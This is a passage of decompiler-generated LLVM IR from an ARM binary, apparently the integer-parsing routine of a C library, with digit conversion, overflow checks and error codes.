  br i1 %v3_161a4, label %.dec_label_pc_16440_crit_edge, label %dec_label_pc_161b0

.dec_label_pc_16440_crit_edge:                    ; preds = %bb189
  br label %dec_label_pc_16440

dec_label_pc_161b0:                               ; preds = %bb188, %bb189
  %v0_161b0 = load i32, i32* @sl, align 4
  %v1_161b0 = add i32 %v0_161b0, 4
  %v2_161b0 = inttoptr i32 %v1_161b0 to i32*
  %v3_161b0 = load i32, i32* %v2_161b0, align 4
  store i32 %v3_161b0, i32* %r2.global-to-local, align 4
  %v1_161b4 = add i32 %v0_161b0, 104
  %v2_161b4 = inttoptr i32 %v1_161b4 to i32*
  %v3_161b4 = load i32, i32* %v2_161b4, align 4
  %v3_161b8 = icmp ult i32 %v3_161b0, %v3_161b4
  br i1 %v3_161b8, label %.thread37.dec_label_pc_16180_crit_edge, label %dec_label_pc_161c8

.thread37.dec_label_pc_16180_crit_edge:           ; preds = %dec_label_pc_161b0
  %v2_161bc = inttoptr i32 %v3_161b0 to i8*
  %v3_161bc = load i8, i8* %v2_161bc, align 1
  %v4_161bc = zext i8 %v3_161bc to i32
  store i32 %v4_161bc, i32* %r0.global-to-local, align 4
  %v6_161bc = add i32 %v3_161b0, 1
  store i32 %v6_161bc, i32* %r2.global-to-local, align 4
  store i32 %v6_161bc, i32* %v2_161b0, align 4
  %v0_16188.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16180

dec_label_pc_161c8:                               ; preds = %dec_label_pc_161b0
  store i32 %v0_161b0, i32* %r0.global-to-local, align 4
  %v1_1617c = call i32 @function_167c8(i32 %v0_161b0)
  store i32 %v1_1617c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16180

dec_label_pc_161d4:                               ; preds = %.thread39.dec_label_pc_161d4_crit_edge, %dec_label_pc_16218
  %v0_161e8 = phi i32 [ %v0_161e8.pre, %.thread39.dec_label_pc_161d4_crit_edge ], [ %v1_161d0, %dec_label_pc_16218 ]
  %v0_161d4 = load i32, i32* @r4, align 4
  %v3_161d4 = mul i32 %v0_161d4, 8
  store i32 %v3_161d4, i32* @r2, align 4
  %v2_161dc = mul i32 %v0_161d4, 10
  %v1_161e0 = load i32, i32* @r5, align 4
  %v2_161e0 = add i32 %v1_161e0, %v2_161dc
  %v1_161e4 = add i32 %v2_161e0, -48
  store i32 %v1_161e4, i32* @r4, align 4
  store i32 %v0_161e8, i32* @r5, align 4
  br label %dec_label_pc_161ec

dec_label_pc_161ec:                               ; preds = %dec_label_pc_161ec.preheader, %dec_label_pc_161d4
  %v0_16504 = phi i32 [ 0, %dec_label_pc_161ec.preheader ], [ %v1_161e4, %dec_label_pc_161d4 ]
  %v0_161f0 = phi i32 [ %v0_1609c, %dec_label_pc_161ec.preheader ], [ %v0_161e8, %dec_label_pc_161d4 ]
  %v1_161f0 = add i32 %v0_161f0, -48
  store i32 %v1_161f0, i32* %r0.global-to-local, align 4
  %v2_161f4 = icmp ugt i32 %v1_161f0, 8
  %v7_161f4 = icmp eq i32 %v1_161f0, 9
  %v2_161f8 = xor i1 %v2_161f4, true
  %v3_161f8 = or i1 %v7_161f4, %v2_161f8
  br i1 %v3_161f8, label %bb190, label %bb192

bb190:                                            ; preds = %dec_label_pc_161ec
  %v7_161f8 = icmp ugt i32 %v0_16504, 429496727
  %v13_161f8 = icmp eq i32 %v0_16504, 429496728
  br label %bb192

bb192:                                            ; preds = %dec_label_pc_161ec, %bb190
  %v1_161fc = phi i1 [ false, %dec_label_pc_161ec ], [ %v13_161f8, %bb190 ]
  %v0_161fc = phi i1 [ %v2_161f4, %dec_label_pc_161ec ], [ %v7_161f8, %bb190 ]
  %v2_161fc = xor i1 %v1_161fc, true
  %v3_161fc = and i1 %v0_161fc, %v2_161fc
  br i1 %v3_161fc, label %dec_label_pc_16504, label %dec_label_pc_16200

dec_label_pc_16200:                               ; preds = %bb192
  %v0_16200 = load i32, i32* @sl, align 4
  %v1_16200 = add i32 %v0_16200, 4
  %v2_16200 = inttoptr i32 %v1_16200 to i32*
  %v3_16200 = load i32, i32* %v2_16200, align 4
  store i32 %v3_16200, i32* %r2.global-to-local, align 4
  %v1_16204 = add i32 %v0_16200, 104
  %v2_16204 = inttoptr i32 %v1_16204 to i32*
  %v3_16204 = load i32, i32* %v2_16204, align 4
  %v3_16208 = icmp ult i32 %v3_16200, %v3_16204
  br i1 %v3_16208, label %.thread39.dec_label_pc_161d4_crit_edge, label %dec_label_pc_16218

.thread39.dec_label_pc_161d4_crit_edge:           ; preds = %dec_label_pc_16200
  %v2_1620c = inttoptr i32 %v3_16200 to i8*
  %v3_1620c = load i8, i8* %v2_1620c, align 1
  %v4_1620c = zext i8 %v3_1620c to i32
  store i32 %v4_1620c, i32* %r0.global-to-local, align 4
  %v6_1620c = add i32 %v3_16200, 1
  store i32 %v6_1620c, i32* %r2.global-to-local, align 4
  store i32 %v6_1620c, i32* %v2_16200, align 4
  %v0_161e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161d4

dec_label_pc_16218:                               ; preds = %dec_label_pc_16200
  store i32 %v0_16200, i32* %r0.global-to-local, align 4
  %v1_161d0 = call i32 @function_167c8(i32 %v0_16200)
  store i32 %v1_161d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161d4

dec_label_pc_1621c:                               ; preds = %bb183
  %v0_1621c = load i32, i32* @sl, align 4
  %v1_1621c = add i32 %v0_1621c, 104
  %v2_1621c = inttoptr i32 %v1_1621c to i32*
  %v3_1621c = load i32, i32* %v2_1621c, align 4
  %v2_16220 = icmp eq i32 %v3_1621c, 0
  br i1 %v2_16220, label %.thread42, label %bb193

bb193:                                            ; preds = %dec_label_pc_1621c
  %v2_16224 = add i32 %v0_1621c, 4
  %v3_16224 = inttoptr i32 %v2_16224 to i32*
  %v4_16224 = load i32, i32* %v3_16224, align 4
  %v2_16228 = add i32 %v4_16224, -1
  store i32 %v2_16228, i32* %v3_16224, align 4
  %v0_16238.pre = load i32, i32* @sl, align 4
  %v1_1623c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_1621c, %bb193
  %v1_1623c = phi i32 [ %v0_1607c, %dec_label_pc_1621c ], [ %v1_1623c.pre, %bb193 ]
  %v0_16238 = phi i32 [ %v0_1621c, %dec_label_pc_1621c ], [ %v0_16238.pre, %bb193 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v0_16238, i32* %r0.global-to-local, align 4
  %v7_1623c = call i32 @function_16764(i32 %v0_16238, i32 %v1_1623c, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1623c, i32* %r0.global-to-local, align 4
  %v0_16240 = call i32 @function_12f18()
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  %v2_16258 = inttoptr i32 %v0_16240 to i32*
  store i32 22, i32* %v2_16258, align 4
  %v2_16260 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_16260, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16264

dec_label_pc_16264:                               ; preds = %dec_label_pc_16734, %dec_label_pc_16708, %dec_label_pc_166d4, %dec_label_pc_16614, %dec_label_pc_16404, %dec_label_pc_163a0, %dec_label_pc_16270, %.thread42
  %v1_1626c = phi i32 [ 0, %dec_label_pc_16734 ], [ 0, %dec_label_pc_16708 ], [ %v1_1626c.pre, %dec_label_pc_166d4 ], [ %v2_16644, %dec_label_pc_16614 ], [ %v2_16418, %dec_label_pc_16404 ], [ %v2_163b0, %dec_label_pc_163a0 ], [ %v0_1628c, %dec_label_pc_16270 ], [ %v2_16260, %.thread42 ]
  store i32 %v6_15fa4, i32* @r5, align 4
  store i32 %v12_15fa4, i32* @r7, align 4
  store i32 %v15_15fa4, i32* @r8, align 4
  store i32 %v18_15fa4, i32* @sb, align 4
  store i32 %v21_15fa4, i32* @sl, align 4
  store i32 %v24_15fa4, i32* @fp, align 4
  ret i32 %v1_1626c

dec_label_pc_16270:                               ; preds = %dec_label_pc_15fa4
  %v0_16270 = call i32 @function_12f18()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  %v2_16288 = inttoptr i32 %v0_16270 to i32*
  store i32 22, i32* %v2_16288, align 4
  %v0_1628c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1628c, i32* %r0.global-to-local, align 4
  %v0_16290 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16290, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16264

dec_label_pc_162a4:                               ; preds = %bb197
  %v9_1631c = icmp eq i32 %v0_1631c, %v6_16308
  br i1 %v9_1631c, label %dec_label_pc_16434, label %dec_label_pc_162a8

dec_label_pc_162a8:                               ; preds = %dec_label_pc_16434, %dec_label_pc_162a4
  %v0_162a8 = load i32, i32* @sl, align 4
  %v1_162a8 = add i32 %v0_162a8, 4
  %v2_162a8 = inttoptr i32 %v1_162a8 to i32*
  %v3_162a8 = load i32, i32* %v2_162a8, align 4
  store i32 %v3_162a8, i32* %r2.global-to-local, align 4
  %v1_162ac = add i32 %v0_162a8, 104
  %v2_162ac = inttoptr i32 %v1_162ac to i32*
  %v3_162ac = load i32, i32* %v2_162ac, align 4
  %v3_162b0 = icmp ult i32 %v3_162a8, %v3_162ac
  br i1 %v3_162b0, label %.thread43, label %dec_label_pc_163f4

.thread43:                                        ; preds = %dec_label_pc_162a8
  %v2_162b4 = inttoptr i32 %v3_162a8 to i8*
  %v3_162b4 = load i8, i8* %v2_162b4, align 1
  %v4_162b4 = zext i8 %v3_162b4 to i32
  store i32 %v4_162b4, i32* %r0.global-to-local, align 4
  %v6_162b4 = add i32 %v3_162a8, 1
  store i32 %v6_162b4, i32* %r2.global-to-local, align 4
  store i32 %v6_162b4, i32* %v2_162a8, align 4
  br label %dec_label_pc_162c0

dec_label_pc_162c0:                               ; preds = %.thread43, %dec_label_pc_163f4
  %v0_162c0 = load i32, i32* @r7, align 4
  %v1_162c0 = load i32, i32* @r5, align 4
  %v6_162c0 = shl i32 %v0_162c0, %v1_162c0
  %v0_162c4 = load i32, i32* @r8, align 4
  %v1_162c4 = icmp slt i32 %v0_162c4, 0
  %v1_162c8 = load i32, i32* @r6, align 4
  %v2_162c8 = load i32, i32* @sb, align 4
  %v7_162c8 = lshr i32 %v1_162c8, %v2_162c8
  %v8_162c8 = or i32 %v7_162c8, %v6_162c0
  %v6_162cc = shl i32 %v1_162c8, %v1_162c0
  br i1 %v1_162c4, label %bb195, label %bb194

bb194:                                            ; preds = %dec_label_pc_162c0
  %v9_162d0 = shl i32 %v1_162c8, %v0_162c4
  br label %bb195

bb195:                                            ; preds = %dec_label_pc_162c0, %bb194
  %storemerge233 = phi i32 [ %v9_162d0, %bb194 ], [ %v8_162c8, %dec_label_pc_162c0 ]
  %v1_162ec = phi i32 [ %v9_162d0, %bb194 ], [ %v8_162c8, %dec_label_pc_162c0 ]
  store i32 %storemerge233, i32* @r4, align 4
  %v0_162d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_162d8 = add i32 %v0_162d8, ptrtoint (i32* @global_var_1a031.648 to i32)
  store i32 %v2_162d8, i32* %r2.global-to-local, align 4
  %v0_162dc = load i32, i32* @fp, align 4
  %v1_162dc = urem i32 %v0_162dc, 256
  store i32 %v1_162dc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_162e4 = add i32 %v0_162d8, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_162e4 = inttoptr i32 %v1_162e4 to i8*
  %v3_162e4 = load i8, i8* %v2_162e4, align 1
  %v4_162e4 = zext i8 %v3_162e4 to i32
  store i32 %v4_162e4, i32* @fp, align 4
  %v2_162e8 = or i32 %v1_162dc, %v6_162cc
  br label %dec_label_pc_162f0

dec_label_pc_162f0:                               ; preds = %bb185, %bb186, %bb195
  %storemerge = phi i32 [ %v2_162e8, %bb195 ], [ %v0_16298, %bb185 ], [ %v0_16298, %bb186 ]
  %v0_16314 = phi i32 [ %v1_162c0, %bb195 ], [ %v0_162f8121, %bb185 ], [ %v0_162f8121, %bb186 ]
  %v0_16328 = phi i32 [ %v4_162e4, %bb195 ], [ %v4_160f8, %bb185 ], [ %v4_160f8, %bb186 ]
  %v0_1631c = phi i32 [ %v1_162ec, %bb195 ], [ 0, %bb185 ], [ 0, %bb186 ]
  store i32 %storemerge, i32* @r6, align 4
  store i32 %v0_1631c, i32* @r7, align 4
  store i32 %v1_160ac, i32* %r2.global-to-local, align 4
  %v3_162f4 = icmp ult i32 %v0_16328, %v1_160ac
  %v1_162f8 = sub i32 32, %v0_16314
  store i32 %v1_162f8, i32* @sb, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  br i1 %v3_162f4, label %dec_label_pc_16308, label %dec_label_pc_1635c

dec_label_pc_16308:                               ; preds = %dec_label_pc_162f0
  %v6_16308 = lshr i32 -1, %v0_16314
  %v7_16310 = shl i32 -1, %v1_162f8
  %v8_16310 = or i32 %v7_16310, %v6_16308
  store i32 %v8_16310, i32* %r2.global-to-local, align 4
  %v1_16314 = add i32 %v0_16314, -32
  store i32 %v1_16314, i32* @r8, align 4
  %v6_16314 = icmp slt i32 %v1_16314, 0
  br i1 %v6_16314, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_16308
  %v7_16318 = lshr i32 -1, %v1_16314
  store i32 %v7_16318, i32* %r2.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_16308, %bb196
  %v1_16434 = phi i32 [ %v8_16310, %dec_label_pc_16308 ], [ %v7_16318, %bb196 ]
  %tmp238 = icmp ugt i32 %v0_1631c, %v6_16308
  br i1 %tmp238, label %dec_label_pc_16324, label %dec_label_pc_162a4

dec_label_pc_16324:                               ; preds = %bb197
  store i32 %v1_160ac, i32* @r4, align 4
  br label %dec_label_pc_163d8

dec_label_pc_16330:                               ; preds = %dec_label_pc_163cc
  %v0_16330 = call i32 @function_12f18()
  store i32 %v0_16330, i32* %r0.global-to-local, align 4
  %v3_16334 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16334, i32* %r1.global-to-local, align 4
  %v1_16338 = urem i32 %v3_16334, 2
  store i32 34, i32* %r2.global-to-local, align 4
  %v2_16340 = icmp eq i32 %v1_16338, 0
  %v2_16344 = inttoptr i32 %v0_16330 to i32*
  store i32 34, i32* %v2_16344, align 4
  br i1 %v2_16340, label %dec_label_pc_16608, label %dec_label_pc_1634c

dec_label_pc_1634c:                               ; preds = %dec_label_pc_16330
  %v0_1634c = load i32, i32* %r2.global-to-local, align 4
  %v1_1634c = add i32 %v0_1634c, -34
  store i32 %v1_1634c, i32* %r2.global-to-local, align 4
  %v2_16354 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_16354, i32* @r6, align 4
  store i32 %arg5, i32* @r7, align 4
  br label %dec_label_pc_1635c

dec_label_pc_1635c:                               ; preds = %dec_label_pc_162f0, %dec_label_pc_1644c, %dec_label_pc_16440, %dec_label_pc_16544, %dec_label_pc_1653c, %dec_label_pc_16608, %dec_label_pc_1634c
  %v1_16374231 = phi i32 [ %arg5, %dec_label_pc_16608 ], [ %arg5, %dec_label_pc_1634c ], [ %v0_16578, %dec_label_pc_1653c ], [ 0, %dec_label_pc_16440 ], [ %v0_16578, %dec_label_pc_16544 ], [ %v0_1631c, %dec_label_pc_162f0 ], [ %v5_1645c, %dec_label_pc_1644c ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_16608 ], [ %v1_1634c, %dec_label_pc_1634c ], [ %stack_var_-44.1, %dec_label_pc_1653c ], [ %stack_var_-44.1, %dec_label_pc_16440 ], [ %stack_var_-44.1, %dec_label_pc_16544 ], [ %stack_var_-44.1, %dec_label_pc_162f0 ], [ %stack_var_-44.1, %dec_label_pc_1644c ]
  %v0_1635c = load i32, i32* @sl, align 4
  %v1_1635c = add i32 %v0_1635c, 104
  %v2_1635c = inttoptr i32 %v1_1635c to i32*
  %v3_1635c = load i32, i32* %v2_1635c, align 4
  %v2_16360 = icmp eq i32 %v3_1635c, 0
  br i1 %v2_16360, label %.thread46, label %bb198

bb198:                                            ; preds = %dec_label_pc_1635c
  %v2_16364 = add i32 %v0_1635c, 4
  %v3_16364 = inttoptr i32 %v2_16364 to i32*
  %v4_16364 = load i32, i32* %v3_16364, align 4
  %v2_16368 = add i32 %v4_16364, -1
  store i32 %v2_16368, i32* %v3_16364, align 4
  %v1_16374.pre = load i32, i32* @r7, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1635c, %bb198
  %v1_16374 = phi i32 [ %v1_16374231, %dec_label_pc_1635c ], [ %v1_16374.pre, %bb198 ]
  %v3_16374 = icmp ule i32 %v1_16374, %arg5
  %v9_16374 = icmp eq i32 %v1_16374, %arg5
  %v2_16378 = xor i1 %v9_16374, true
  %v3_16378 = and i1 %v3_16374, %v2_16378
  br i1 %v3_16378, label %dec_label_pc_16404, label %dec_label_pc_1637c

dec_label_pc_1637c:                               ; preds = %.thread46
  %v3_1664c = load i32, i32* %stack_var_0, align 4
  br i1 %v9_16374, label %dec_label_pc_1664c, label %dec_label_pc_16380

dec_label_pc_16380:                               ; preds = %dec_label_pc_1637c, %dec_label_pc_1664c
  store i32 %v3_1664c, i32* %r1.global-to-local, align 4
  %v1_16388 = urem i32 %v3_1664c, 2
  %v2_1638c = or i32 %v1_16388, %stack_var_-44.2
  store i32 %v2_1638c, i32* %r2.global-to-local, align 4
  %v4_1638c = icmp eq i32 %v2_1638c, 0
  br i1 %v4_1638c, label %dec_label_pc_16614, label %dec_label_pc_16394

dec_label_pc_16394:                               ; preds = %dec_label_pc_16380
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %tmp239 = icmp ugt i32 %v1_16374, %arg5
  br i1 %tmp239, label %dec_label_pc_163a0, label %dec_label_pc_16400

dec_label_pc_163a0:                               ; preds = %dec_label_pc_1665c, %dec_label_pc_16394
  %v0_163a0 = call i32 @function_12f18()
  %v2_163a8 = inttoptr i32 %v0_163a0 to i32*
  store i32 34, i32* %v2_163a8, align 4
  %v2_163b0 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_163b0, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16264

dec_label_pc_163c0:                               ; preds = %.thread47.dec_label_pc_163c0_crit_edge, %dec_label_pc_163f0
  %v0_163c4 = phi i32 [ %v0_163c4.pre, %.thread47.dec_label_pc_163c0_crit_edge ], [ %v1_163bc, %dec_label_pc_163f0 ]
  %v1_163c8 = add i32 %v0_163c4, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_163c8 = inttoptr i32 %v1_163c8 to i8*
  %v3_163c8 = load i8, i8* %v2_163c8, align 1
  %v4_163c8 = zext i8 %v3_163c8 to i32
  br label %dec_label_pc_163cc

dec_label_pc_163cc:                               ; preds = %dec_label_pc_164e8, %dec_label_pc_164dc.dec_label_pc_163cc.loopexit206_crit_edge, %dec_label_pc_16434, %.thread144, %dec_label_pc_163c0
  %v0_163d0 = phi i32 [ %v4_163c8, %dec_label_pc_163c0 ], [ %v6_16548, %.thread144 ], [ %v0_16328, %dec_label_pc_16434 ], [ %v0_163d0.pre.pre, %dec_label_pc_164dc.dec_label_pc_163cc.loopexit206_crit_edge ], [ %v0_1649c, %dec_label_pc_164e8 ]
  %stack_var_-60.2.off0 = phi i32 [ %stack_var_-60.3.off0, %dec_label_pc_163c0 ], [ 10, %.thread144 ], [ %v1_160ac, %dec_label_pc_16434 ], [ %v1_160ac, %dec_label_pc_164dc.dec_label_pc_163cc.loopexit206_crit_edge ], [ %v1_160ac, %dec_label_pc_164e8 ]
  store i32 %stack_var_-60.2.off0, i32* @r4, align 4
  %v3_163d0 = icmp ult i32 %v0_163d0, %stack_var_-60.2.off0
  br i1 %v3_163d0, label %dec_label_pc_163d8, label %dec_label_pc_16330

dec_label_pc_163d8:                               ; preds = %dec_label_pc_163cc, %dec_label_pc_16324
  %stack_var_-60.3.off0 = phi i32 [ %stack_var_-60.2.off0, %dec_label_pc_163cc ], [ %v1_160ac, %dec_label_pc_16324 ]
  %v0_163d8 = load i32, i32* @sl, align 4
  %v1_163d8 = add i32 %v0_163d8, 4
  %v2_163d8 = inttoptr i32 %v1_163d8 to i32*
  %v3_163d8 = load i32, i32* %v2_163d8, align 4
  store i32 %v3_163d8, i32* %r2.global-to-local, align 4
  %v1_163dc = add i32 %v0_163d8, 104
  %v2_163dc = inttoptr i32 %v1_163dc to i32*
  %v3_163dc = load i32, i32* %v2_163dc, align 4
  %v3_163e0 = icmp ult i32 %v3_163d8, %v3_163dc
  br i1 %v3_163e0, label %.thread47.dec_label_pc_163c0_crit_edge, label %dec_label_pc_163f0

.thread47.dec_label_pc_163c0_crit_edge:           ; preds = %dec_label_pc_163d8
  %v2_163e4 = inttoptr i32 %v3_163d8 to i8*
  %v3_163e4 = load i8, i8* %v2_163e4, align 1
  %v4_163e4 = zext i8 %v3_163e4 to i32
  store i32 %v4_163e4, i32* %r0.global-to-local, align 4
  %v6_163e4 = add i32 %v3_163d8, 1
  store i32 %v6_163e4, i32* %r2.global-to-local, align 4
  store i32 %v6_163e4, i32* %v2_163d8, align 4
  %v0_163c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_163c0

dec_label_pc_163f0:                               ; preds = %dec_label_pc_163d8
  store i32 %v0_163d8, i32* %r0.global-to-local, align 4
  %v1_163bc = call i32 @function_167c8(i32 %v0_163d8)
  store i32 %v1_163bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_163c0

dec_label_pc_163f4:                               ; preds = %dec_label_pc_162a8
  store i32 %v0_162a8, i32* %r0.global-to-local, align 4
  %v1_163f8 = call i32 @function_167c8(i32 %v0_162a8)
  store i32 %v1_163f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_162c0

dec_label_pc_16400:                               ; preds = %dec_label_pc_16394
  br i1 %v9_16374, label %dec_label_pc_1665c, label %dec_label_pc_16404

dec_label_pc_16404:                               ; preds = %dec_label_pc_1665c, %dec_label_pc_1664c, %dec_label_pc_16400, %.thread46
  %v3_1640c = ashr i32 %stack_var_-44.2, 31
  %v1_16410 = load i32, i32* @r6, align 4
  %v2_16410 = xor i32 %v1_16410, %stack_var_-44.2
  %v2_16414 = xor i32 %v1_16374, %v3_1640c
  %v2_16418 = sub i32 %v2_16410, %stack_var_-44.2
  %v3_16418 = icmp uge i32 %v2_16410, %stack_var_-44.2
  %v3_1641c = icmp eq i1 %v3_16418, false
  %v4_1641c = sub i32 %v2_16414, %v3_1640c
  %v6_1641c = sext i1 %v3_1641c to i32
  %v7_1641c = add i32 %v6_1641c, %v4_1641c
  store i32 %v7_1641c, i32* %r2.global-to-local, align 4
  store i32 %v2_16418, i32* %stack_var_0, align 4
  store i32 %v2_16418, i32* %r0.global-to-local, align 4
  store i32 %v7_1641c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16264

dec_label_pc_16434:                               ; preds = %dec_label_pc_162a4
  %tmp240 = icmp ugt i32 %storemerge, %v1_16434
  br i1 %tmp240, label %dec_label_pc_163cc, label %dec_label_pc_162a8

dec_label_pc_16440:                               ; preds = %bb188, %.dec_label_pc_16440_crit_edge
  store i32 %v0_16440, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v3_1646461 = icmp ult i32 %v0_1646459, %v1_160ac
  br i1 %v3_1646461, label %dec_label_pc_16490, label %dec_label_pc_1635c

dec_label_pc_1644c:                               ; preds = %.thread49.dec_label_pc_1644c_crit_edge, %dec_label_pc_164d0
  %v0_16450 = phi i32 [ %v0_16450.pre, %.thread49.dec_label_pc_1644c_crit_edge ], [ %v1_164d4, %dec_label_pc_164d0 ]
  %v0_16454 = load i32, i32* @r4, align 4
  %v1_16454 = load i32, i32* @r8, align 4
  %v2_16454 = add i32 %v1_16454, %v0_16454
  store i32 %v2_16454, i32* @r6, align 4
  %v3_16454 = icmp ult i32 %v2_16454, %v0_16454
  %v1_16458 = add i32 %v0_16450, add (i32 ptrtoint (i32* @global_var_1a031.648 to i32), i32 1)
  %v2_16458 = inttoptr i32 %v1_16458 to i8*
  %v3_16458 = load i8, i8* %v2_16458, align 1
  %v4_16458 = zext i8 %v3_16458 to i32
  store i32 %v4_16458, i32* @fp, align 4
  %v0_1645c = load i32, i32* @r5, align 4
  %v1_1645c = load i32, i32* @sb, align 4
  %v4_1645c = zext i1 %v3_16454 to i32
  %v3_1645c = add i32 %v0_1645c, %v4_1645c
  %v5_1645c = add i32 %v3_1645c, %v1_1645c
  store i32 %v5_1645c, i32* @r7, align 4
  %v3_16464 = icmp ult i32 %v4_16458, %v1_160ac
  br i1 %v3_16464, label %dec_label_pc_16490, label %dec_label_pc_1635c

dec_label_pc_16490:                               ; preds = %dec_label_pc_1644c, %dec_label_pc_16440
  store i32 %v1_160ac, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r0, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %v1_160ac, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v5_16484 = call i32 @function_17698(i32 -1, i32 -1, i32 %v1_160ac, i32 0)
  store i32 %v5_16484, i32* %r0.global-to-local, align 4
  %v0_16488 = load i32, i32* @r7, align 4
  %v3_16488 = icmp eq i32 %v0_16488, -1
  %v0_164dc = load i32, i32* @r6, align 4
  br i1 %v3_16488, label %dec_label_pc_164dc, label %dec_label_pc_164b4

dec_label_pc_164b4:                               ; preds = %dec_label_pc_16490, %dec_label_pc_164dc
  %v1_16494 = zext i32 %v0_164dc to i64
  %v2_16494 = load i32, i32* @r4, align 4
  %v3_16494 = zext i32 %v2_16494 to i64
  %v4_16494 = mul nuw i64 %v3_16494, %v1_16494
  %v5_16494 = udiv i64 %v4_16494, 4294967296
  %v6_16494 = trunc i64 %v5_16494 to i32
  %v7_16494 = trunc i64 %v4_16494 to i32
  store i32 %v7_16494, i32* @r8, align 4
  %v3_16498 = mul i32 %v2_16494, %v0_16488
  %v4_16498 = add i32 %v6_16494, %v3_16498
  store i32 %v4_16498, i32* @sb, align 4
  %v0_1649c = load i32, i32* @fp, align 4
  %v1_1649c = urem i32 %v0_1649c, 256
  store i32 %v1_1649c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v3_164a8 = icmp eq i32 %v4_16498, -1
  %v0_1649c.not = or i32 %v0_1649c, -256
  %v1_164ac = xor i32 %v0_1649c.not, 255
  store i32 %v1_164ac, i32* %r2.global-to-local, align 4
  br i1 %v3_164a8, label %dec_label_pc_164e8, label %dec_label_pc_164b8

dec_label_pc_164b8:                               ; preds = %dec_label_pc_164e8, %dec_label_pc_164b4
  %v0_164b8 = load i32, i32* @sl, align 4
  %v1_164b8 = add i32 %v0_164b8, 4
  %v2_164b8 = inttoptr i32 %v1_164b8 to i32*
  %v3_164b8 = load i32, i32* %v2_164b8, align 4
  store i32 %v3_164b8, i32* %r2.global-to-local, align 4
  %v1_164bc = add i32 %v0_164b8, 104
  %v2_164bc = inttoptr i32 %v1_164bc to i32*
  %v3_164bc = load i32, i32* %v2_164bc, align 4
  %v3_164c0 = icmp ult i32 %v3_164b8, %v3_164bc
  br i1 %v3_164c0, label %.thread49.dec_label_pc_1644c_crit_edge, label %dec_label_pc_164d0

.thread49.dec_label_pc_1644c_crit_edge:           ; preds = %dec_label_pc_164b8
  %v2_164c4 = inttoptr i32 %v3_164b8 to i8*
  %v3_164c4 = load i8, i8* %v2_164c4, align 1
  %v4_164c4 = zext i8 %v3_164c4 to i32
  store i32 %v4_164c4, i32* %r0.global-to-local, align 4
  %v6_164c4 = add i32 %v3_164b8, 1
  store i32 %v6_164c4, i32* %r2.global-to-local, align 4
  store i32 %v6_164c4, i32* %v2_164b8, align 4
  %v0_16450.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1644c

dec_label_pc_164d0:                               ; preds = %dec_label_pc_164b8
  store i32 %v0_164b8, i32* %r0.global-to-local, align 4
  %v1_164d4 = call i32 @function_167c8(i32 %v0_164b8)
  store i32 %v1_164d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1644c

dec_label_pc_164dc:                               ; preds = %dec_label_pc_16490
  %tmp241 = icmp ugt i32 %v0_164dc, %v5_16484
  br i1 %tmp241, label %dec_label_pc_164dc.dec_label_pc_163cc.loopexit206_crit_edge, label %dec_label_pc_164b4

dec_label_pc_164dc.dec_label_pc_163cc.loopexit206_crit_edge: ; preds = %dec_label_pc_164dc
  %v0_163d0.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_163cc

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164b4
  %tmp242 = icmp ugt i32 %v7_16494, %v1_164ac
  br i1 %tmp242, label %dec_label_pc_163cc, label %dec_label_pc_164b8

dec_label_pc_164f4:                               ; preds = %dec_label_pc_16024
  store i32 %v0_16024, i32* %r0.global-to-local, align 4
  %v1_164f8 = call i32 @function_167c8(i32 %v0_16024)
  store i32 %v1_164f8, i32* %r0.global-to-local, align 4
  store i32 %v1_164f8, i32* @r5, align 4
  br label %dec_label_pc_1603c

dec_label_pc_16504:                               ; preds = %bb192
  store i32 %v0_16504, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1650c

dec_label_pc_1650c:                               ; preds = %dec_label_pc_165d4, %dec_label_pc_16504
